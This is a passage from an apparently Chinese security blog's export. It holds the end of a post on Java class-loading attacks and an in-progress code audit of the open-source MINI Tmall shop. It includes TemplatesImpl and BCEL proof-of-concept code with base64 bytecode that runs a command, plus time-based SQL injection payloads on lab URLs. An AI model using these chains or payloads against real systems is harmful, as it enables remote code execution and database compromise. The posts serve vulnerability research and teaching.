class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">    field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    field.set(obj, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分别设置上诉提到的四个属性的值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;base64编码后的字节码&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">    setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">    setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;Calc&quot;</span>);</span><br><span class=\"line\">    setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,codes);</span><br><span class=\"line\">    setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\">    templates.newTransformer();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>cmd生成base64字节码文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">certutil -encode <span class=\"string\">&quot;Calc.class&quot;</span> <span class=\"string\">&quot;Calc_base64.txt&quot;</span></span><br></pre></td></tr></table></figure>\n<p>运行后发现报错了</p>\n<p><img src=\"ka8iodQq-vaR3EiAS_eGrHy4FcJMXcldKMSrNhIt_Tw.png\" alt=\"image\"></p>\n<p>要求字节码必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类</p>\n<p><img src=\"lh0jiYAag1VpFY57TqUut-eYRWsxhgfiilUnrPe9q9o.png\" alt=\"image\"></p>\n<p>下面我们创建个子类来生成字节码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.classloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ByteClass</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractTranslet</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ByteClass</span> <span class=\"variable\">byteClass</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteClass</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ByteClass</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最终的POC为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.classloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TemplatesImplDFC</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAJAcAFgoAAQAXCgAHABcKABgAGQgAGgoAGAAbBwAcAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAHgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYBAApTb3VyY2VGaWxlAQAOQnl0ZUNsYXNzLmphdmEBACFjb20vZ2FyY2szaC9jbGFzc2xvYWRlci9CeXRlQ2xhc3MMABIAEwcAHwwAIAAhAQAEY2FsYwwAIgAjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEAAQAHAAAAAAAEAAkACAAJAAIACgAAACUAAgACAAAACbsAAVm3AAJMsQAAAAEACwAAAAoAAgAAAA0ACAAOAAwAAAAEAAEADQABAA4ADwACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEgAMAAAABAABABAAAQAOABEAAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABcADAAAAAQAAQAQAAEAEgATAAIACgAAAC4AAgABAAAADiq3AAO4AAQSBbYABlexAAAAAQALAAAADgADAAAAGAAEABkADQAaAAwAAAAEAAEADQABABQAAAACABU&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\">        templates.newTransformer();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"5Nd6t3R0tUCdDY56ebemsqefToQeNo_JAiGm1BXKN64.png\" alt=\"image\"></p>\n<h2 id=\"BCEL-ClassLoader加载字节码\"><a href=\"#BCEL-ClassLoader加载字节码\" class=\"headerlink\" title=\"BCEL ClassLoader加载字节码\"></a>BCEL ClassLoader加载字节码</h2><p>BCEL 提供了一种方便的方式来操作字节码，使开发人员能够在运行时生成、修改和操作字节码，从而实现对 Java 类的动态修改和定制。它也是调用 defineClass 方法加载字节码，但需要注意的是在Java 8u251以后，该类被删除。</p>\n<p>在ClassLoader.loadClass()中，检查该类名是否包含特殊字符串”$$BCEL$$“，如果是的话，会调用 createClass 方法创建该类。</p>\n<p><img src=\"VAnPUJ3Q_Mb5Z4BSJynztHC7IAaGv8fnXKxVN72chGo.png\" alt=\"image\"></p>\n<p>我们跟进createClass；此方法会查找字符串”$$BCEL$$“来确定实际类名的起始位置；然后尝试解码实际类名，将其转换为字节数组，然后返回clazz</p>\n<p><img src=\"HVWoEtFsuPX08-4qdxOuzYPO5bojptdEKdc6440t4Ks.png\" alt=\"image\"></p>\n<p>紧接着就是判断如果clazz不为空，就调用defineClass来加载。</p>\n<p><img src=\"7qp5Slirp87E_SKT4X0Ole5CzCvVzquW8DU_n9GNccQ.png\" alt=\"image\"></p>\n<p>测试弹计算器：CalcTest.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CalcTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc.exe&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.classloader;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        diaplay();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">diaplay</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello world!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>然后将CalcTest生成BCEL形式的字节码.</p>\n<p>一般通过BCEL提供的两个类Repository 和Utility 来利用；可以通过Repository查找已加载的类、加载新的类、获取类的信息等操作；这里用于将一个Java  Class先转换成原生字节码。Utility类是BCEL提供的一个工具类，其中包含了各种用于处理字节码的实用方法。它提供了字节码转换、解码、编码、类型转换等功能；这里用于将原生的字节码转换成BCEL格式的字节码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.classloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BCELDFC</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//方式一：</span></span><br><span class=\"line\">        <span class=\"type\">JavaClass</span> <span class=\"variable\">javaClass</span> <span class=\"operator\">=</span> Repository.lookupClass(test.class);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">code1</span> <span class=\"operator\">=</span> Utility.encode(javaClass.getBytes(), <span class=\"literal\">true</span>);</span><br><span class=\"line\">        System.out.println(code1);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">ClassLoader</span>().loadClass(<span class=\"string\">&quot;$$BCEL$$&quot;</span> + code1).newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方式二：</span></span><br><span class=\"line\"><span class=\"comment\">//        byte[] codebyte = Files.readAllBytes(Paths.get(&quot;D:\\\\down\\\\CalcTest.class&quot;));</span></span><br><span class=\"line\"><span class=\"comment\">//        String code2 = Utility.encode(codebyte, true);</span></span><br><span class=\"line\"><span class=\"comment\">//        System.out.println(code2);</span></span><br><span class=\"line\"><span class=\"comment\">//        new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + code2).newInstance();</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>方式一：（加载的恶意类需要同一个包，否则没法识别）</p>\n<p><img src=\"R7B-CJ0wVb_IkJSeFSAuDL-6XGjAbfIgwSajy5IQqRE.png\" alt=\"image\"></p>\n<p>方式二：</p>\n<p><img src=\"Y9EG5X5ao-NaKZ7KwAu7JoBVNqp78xUOAg6sVLfwlf0.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.主要分析了类加载的时候，哪些代码块是初始化的。</p>\n<p>2.分析了forname加载的过程，发现初始化是可控的，最终底层是调用了ClassLoader进行加载。</p>\n<p>3.分析了ClassLoader，发现最底层是defineClass进行加载</p>\n<p>4.使用URLClassLoaer进行任意类加载；通过反射使用defineClass</p>\n<p>5.最后研究了两种利用方式</p>\n<p>参考：</p>\n<p>1.<a href=\"https://segmentfault.com/a/1190000023876273\">https://segmentfault.com/a/1190000023876273</a></p>\n<p>2.<a href=\"https://www.bilibili.com/video/BV16h411z7o9?p=4\">https://www.bilibili.com/video/BV16h411z7o9?p=4</a></p>\n<p>3.<a href=\"https://juejin.cn/post/6844903838927814669\">https://juejin.cn/post/6844903838927814669</a></p>\n<p>4.<a href=\"https://blog.csdn.net/Thunderclap_/article/details/128901126\">https://blog.csdn.net/Thunderclap_&#x2F;article&#x2F;details&#x2F;128901126</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","RCE"]},{"title":"MINI天猫商城代码审计","url":"/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"<h1 id=\"MINI天猫商城代码审计\"><a href=\"#MINI天猫商城代码审计\" class=\"headerlink\" title=\"MINI天猫商城代码审计\"></a>MINI天猫商城代码审计</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近看到很多师傅们，都在做这套tmall系统的代码审计，一时起兴趣，就自己也下载下来进行审一审，全程按照自己的思路去审计分析。在此进行简单的记录。</p>\n<h2 id=\"环境搭建与配置\"><a href=\"#环境搭建与配置\" class=\"headerlink\" title=\"环境搭建与配置\"></a>环境搭建与配置</h2><p>项目地址：<a href=\"https://gitee.com/project_team/Tmall_demo\">https://gitee.com/project_team/Tmall_demo</a></p>\n<p>配置文件：src&#x2F;main&#x2F;resources&#x2F;application.properties</p>\n<p>修改为自己的数据库地址，也可以修改启动的端口</p>\n<p><img src=\"A9LKEZadvuLcO8WshiS5_zZu2oQ5uFuwZsIsiBWKutQ.png\" alt=\"image\"></p>\n<p>启动文件：src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;TmallSpringBootApplication.java</p>\n<p>待maven加载完依赖之后，在该文件中进行启动项目。</p>\n<p><img src=\"S4qCXllB0lfY-EYB3VvMopRriHMWrvpgNwjnyxFt2mc.png\" alt=\"image\"></p>\n<p>浏览器访问</p>\n<p><img src=\"sGMZu6i0o4YbnEjwZ8WkzHfvhfnCdM1tu9erfY531HU.png\" alt=\"image\"></p>\n<p>当我进行一些功能的操作的时候，发现报错了。</p>\n<p><img src=\"bRwiZdkeSDU9jSMzbGy8q2itpZdBxABxpjripwgAKA0.png\"></p>\n<p>从下面这篇文章找到了解决方法，大概的意思就是我mysql版本较低，有个sql_mode默认没有开启，需要手动开启一下。</p>\n<p><a href=\"https://www.cnblogs.com/hungryquiter/p/16995127.html\">https://www.cnblogs.com/hungryquiter/p/16995127.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET @@global.sql_mode =<span class=\"string\">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>上述配置是临时开启该模式，重mysql之后会消失。</p>\n<h2 id=\"审计硬编码和使用的供应链\"><a href=\"#审计硬编码和使用的供应链\" class=\"headerlink\" title=\"审计硬编码和使用的供应链\"></a>审计硬编码和使用的供应链</h2><h3 id=\"硬编码\"><a href=\"#硬编码\" class=\"headerlink\" title=\"硬编码\"></a>硬编码</h3><p>直接ctrl+shif+f 全局搜索password 、pass、jdbc等关键字。</p>\n<p>搜索password</p>\n<p><img src=\"dW055RlSMosFZVq3Bsle4y6ZgLBaFc76sWTt31hvpTo.png\" alt=\"image\"></p>\n<p>搜索jdbc</p>\n<p><img src=\"G0pAhAER4GW7XH0vPkzaFeSJI_ejyw3q2_n5f_LUFZk.png\" alt=\"image\"></p>\n<p>上述可看到一些硬编码</p>\n<h3 id=\"供应链安全\"><a href=\"#供应链安全\" class=\"headerlink\" title=\"供应链安全\"></a>供应链安全</h3><p>本项目是使用maven管理，所以直接查看pom.xml文件，分析用了那些依赖以及版本。再去判断是否存在漏洞。</p>\n<p><img src=\"JaLhHxRPGH2PkAW5npc8PT2CFajmXD_vOXIlKuX9oA4.png\" alt=\"image\"></p>\n<p>分析到了druid、fastjson、log4j、springframework.boot等一些比较常见的存在漏洞的组件或框架。</p>\n<p>先对其有大致的了解，后续再深入研究。</p>\n<h2 id=\"审计owaspTop10漏洞\"><a href=\"#审计owaspTop10漏洞\" class=\"headerlink\" title=\"审计owaspTop10漏洞\"></a>审计owaspTop10漏洞</h2><h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><h4 id=\"SQL注入一（后台）\"><a href=\"#SQL注入一（后台）\" class=\"headerlink\" title=\"SQL注入一（后台）\"></a>SQL注入一（后台）</h4><p>分析了一下该项目，发现mybatis的xml文件均存放在&#x2F;Users&#x2F;garck&#x2F;D&#x2F;code&#x2F;java&#x2F;CodeAudit&#x2F;Tmall_demo-master&#x2F;src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper中。</p>\n<p>下面直接搜索这个文件夹下面的带有 “$” 符号的xml文件来进行详细分析。</p>\n<p><img src=\"R5LFjOKJYSV8ZYNvgY1wBB_a6LHJZ6c2R6c3TlBlk0k.png\" alt=\"image\"></p>\n<p><img src=\"RCVvashWJlQe0ZBbzd4B2s9jZJJLnStqrCCiUbiIV7E.png\" alt=\"image\"></p>\n<p>SQL语句使用了“$” 符号，就是使用了拼接的方式进行执行。若能够控制传入的数据，且没有过滤的情况下，可构造payload进行SQL注入。</p>\n<p>下面开始分析 ProductMapper.xml的“${orderUtil.orderBy}”</p>\n<p><img src=\"g58fPkSb12qkbpG9ZTuazo7yl6doXP36ghUfyljL-Aw.png\" alt=\"image\"></p>\n<p>这是一个查询的SQL语句，并且绑定的是select方法，且是属于接⼝com.xq.tmall.dao.ProductMapper的select方法</p>\n<p><img src=\"faR5oAEY5Gu4y1nT1lH9i-JchVHFuBXXuaYyVNm_wNg.png\" alt=\"image\"></p>\n<p>查看该接口，确认存在select方法，且传入了OrderUtil参数</p>\n<p><img src=\"v5616V98pJYf5lR7b-YXr6JcdwNlf4ApqPEcvhYJBe8.png\" alt=\"image\"></p>\n<p>搜索哪个地方调用了这个接口的方法，发现接口实现类ProductServiceImpl中有调用</p>\n<p><img src=\"CJxsIYmAAtLCiNN58-KsMWlhFQYo3IqUOnBUB1HmDGg.png\" alt=\"image\"></p>\n<p>详情</p>\n<p><img src=\"rQ7D9Wcxk6KTbyuhV03hB8WEBYn-xiHUaH4VXWKD1ZE.png\" alt=\"image\"></p>\n<p>ProductService接口类声明的getList，同时传入的orderUtil</p>\n<p><img src=\"PL7q_4fg5FkMFSnz0LHEA8P10jchuNaB14b6ztmWZDM.png\" alt=\"image\"></p>\n<p>看一下orderUtil工具类</p>\n<p><img src=\"4p_n__dpbG5-Tm7F0E1TcTASSkO6PZKBlh1J-olguRM.png\" alt=\"image\"></p>\n<p>搜索哪个controller类中调用了ProductServiceImpl的getList方法，分析一下ForeProductListController168行</p>\n<p><img src=\"R2SbHwlsZsvVw9hhQD1DomChJ51ER_vTUORis7RK5VM.png\" alt=\"image\"></p>\n<p>看了一下这个注释，大概是在 获取商品列表的时候需要调用ProductService.getList。</p>\n<p>还原一下接口URL；确认是GET请求，根路径是product</p>\n<p><img src=\"L_yJC--fe4KS-0Z0R-Ch-vWP-WJQbIZk29h32GCqOXc.png\" alt=\"image\"></p>\n<p>产品高级查询功能；product&#x2F;{index}&#x2F;{count}，看到这里之后，凉凉了，orderUtil不可控。</p>\n<p><img src=\"K4bGIFH65ZSsmckU05MWP8pyWLBxZYAROhKtsDui5yY.png\" alt=\"image\"></p>\n<p>继续找其他调用ProductService.getList的controller类；看一下ProductController类的49行，发现传入的orderUtil为null，直接跳过分析下一个。</p>\n<p><img src=\"NVpD-Nmps9gm3dqPPBGNT-EHJzN7khr0mQ2mea3jrso.png\" alt=\"image\"></p>\n<p>ProductController类的405行，</p>\n<p><img src=\"8dSTKLl4xUWOBIxmVFrKBta2_M9J4d1cL_9qVEk74Z4.png\" alt=\"image\"></p>\n<p>结合OrderUtil的构造方法分析，看看有没有传入orderBy和isDesc这两个参数</p>\n<p><img src=\"_Mzz8zN1vCnyvwngr31N2h-BNbSrmavfTDLX6SrM4v8.png\" alt=\"image\"></p>\n<p>发现参数可控，前端传入orderBy参数到该控制层</p>\n<p><img src=\"13tqRPx3xqZQ83kZtkKTg8HwJbZuCoZ0ognokbRLfR0.png\" alt=\"image\"></p>\n<p>构造payload</p>\n<p>admin&#x2F;product&#x2F;{index}&#x2F;{count}，加上一个统一的前缀&#x2F;tmall后继续访问；&#x2F;tmall&#x2F;admin&#x2F;product&#x2F;</p>\n<p><img src=\"0QG6nM0OaDbiCoTGabMMDLDR5yZTemvwc39QKJw_my0.png\" alt=\"image\"></p>\n<p>登录后台。账号：admin.  密码：123456</p>\n<p>因为这里使用了rest风格的URL，理论上说index和count可以随意输入，所以直接构造到的URL为：<a href=\"http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1\">http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1</a></p>\n<p>注入参数：orderBy</p>\n<p><img src=\"yRIojR8Gm6UI9QON7BC6ZOsalU5du_SjjFsjTqekvmQ.png\" alt=\"image\"></p>\n<p>添加单引号</p>\n<p><img src=\"Nc-FAUCqKvTesqsgAKPDDccRwg-r31LOVF1JA97e260.png\" alt=\"image\"></p>\n<p>延迟5秒</p>\n<p><img src=\"0RPN1gIO7NsY1qs-Y_82bUvR7OLW9PeEhLgawGI_GqE.png\" alt=\"image\"></p>\n<p>sqlmap验证</p>\n<p><img src=\"H5GbOwzVOfd8htyOuM0quyHPGutc1U7XEXMla1pMh4Q.png\" alt=\"image\"></p>\n<p>看了一下过滤器，只做了权限校验。没有做SQL注入的过滤，所以只要发现参数可控的注入的即可注入，不需要绕过。</p>\n<p><img src=\"6QPlX1nJtLPMGa_rnxqVz10dQfyz9wlyxK3TcNhujQM.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入二（前台）\"><a href=\"#SQL注入二（前台）\" class=\"headerlink\" title=\"SQL注入二（前台）\"></a>SQL注入二（前台）</h4><p>继续寻找调用了ProductServiceImpl的getList方法的controller</p>\n<p>ProductService.getList</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">----  ForeHomeController    ###调用ProductService.getList时传入为null，不存在注入</span><br><span class=\"line\">---+  ProductController     ###后台注入</span><br><span class=\"line\">---+  ForeProductListController   ###前台注入</span><br><span class=\"line\">----  ForeProductDetailsController   ###调用ProductService.getList时传入为null，不存在注入</span><br></pre></td></tr></table></figure>\n<p>ForeProductListController的168行传入了orderUtil对象。</p>\n<p><img src=\"1idGrN6XrKL7LK1kDGa1e8j9NGwt2bwwfbkfr500KFM.png\" alt=\"image\"></p>\n<p>分析orderUtil对象的来源。</p>\n<p><img src=\"l6vzVsRfFF5iXLSZGVP_TxXkOWn1tE1votXCQEIebIs.png\" alt=\"image\"></p>\n<p><img src=\"qpm6TF2VikRSreOzScimwNyJBBjwhx6dqqMfmwiJOkg.png\" alt=\"image\"></p>\n<p>进行构造payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.75.154:8090/tmall/product/0/20?orderBy=1 AND (SELECT 3188 FROM (SELECT(SLEEP(5)))KJQA)</span><br></pre></td></tr></table></figure>\n<p><img src=\"9Z0qgqtR-ynJluX--BI9mg6X_Xq3e8F023Hw3zVtdS4.png\" alt=\"image\"></p>\n<p>成功延迟</p>\n<p><img src=\"aZEjn49GvzMTUfxi6MaanU3wnUu1iI9P2fG6S-XtAko.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入三（前台）\"><a href=\"#SQL注入三（前台）\" class=\"headerlink\" title=\"SQL注入三（前台）\"></a>SQL注入三（前台）</h4><p>分析到了利用链：ProductMapper.selectMoreList—ProductService.getMoreList—ForeProductListController(163)。</p>\n<p>需要满足条件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name_split不为空</span><br><span class=\"line\">product_name_split.length长度大于1</span><br></pre></td></tr></table></figure>\n<p><img src=\"b7sJTjIfFVd9cOZv38BpuIYAGEIhcENftkJ7TPbklE8.png\" alt=\"image\"></p>\n<p>溯product_name_split的由来</p>\n<p><img src=\"Pfdv1cTF2FZo2Ke7tId-E9i0c62MyJSvfNtVxpAMOhE.png\" 